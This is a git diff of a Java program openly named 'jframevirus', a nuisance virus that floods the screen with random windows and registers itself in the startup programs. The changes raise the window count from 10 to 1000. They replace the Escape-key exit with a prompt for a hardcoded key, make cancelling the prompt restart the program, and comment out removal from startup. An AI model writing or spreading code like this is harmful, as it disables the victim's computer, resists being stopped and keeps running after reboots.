@@ -2,6 +2,7 @@ package com.joo.jframevirus;
 
 import com.joo.jframevirus.autostart.AutoStartManager;
 
+import javax.swing.*;
 import java.awt.*;
 import java.awt.event.KeyEvent;
 
@@ -31,10 +32,11 @@ public class MainController {
         KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(e -> {
             if (e.getID() == KeyEvent.KEY_PRESSED) {
                 if (e.getKeyCode() == KeyEvent.VK_ESCAPE) {
-                    // Remove the virus from the startup programs
-                    AutoStartManager.getInstance().removeVirusFromStartup();
-                    // Exit the virus
-                    System.exit(0);
+                    VirusStopKey();
+//                    // Remove the virus from the startup programs
+//                    AutoStartManager.getInstance().removeVirusFromStartup();
+//                    // Exit the virus
+//                    System.exit(0);
                 }
             }
             return false;
@@ -52,9 +54,22 @@ public class MainController {
     }
     public void startRandomFrame(){
         new Thread(() -> {
-            for (int i = 0; i < 10; i++) {
+            for (int i = 0; i < 1000; i++) {
                 new RandomFrame(screenSize);
             }
         }).start();
+    }
+    public void VirusStopKey(){
+           String input;
+           String Key = "AnasAndJooVirus8092789166";
+           String Massage ="To stop virus write Key ";
+             try {
+             input = JOptionPane.showInputDialog(Massage);
+             if (input.equals(Key)){
+                 System.exit(0);
+             }
+             } catch (Exception e) {
+                 new MainController();
+             }
     }
 }
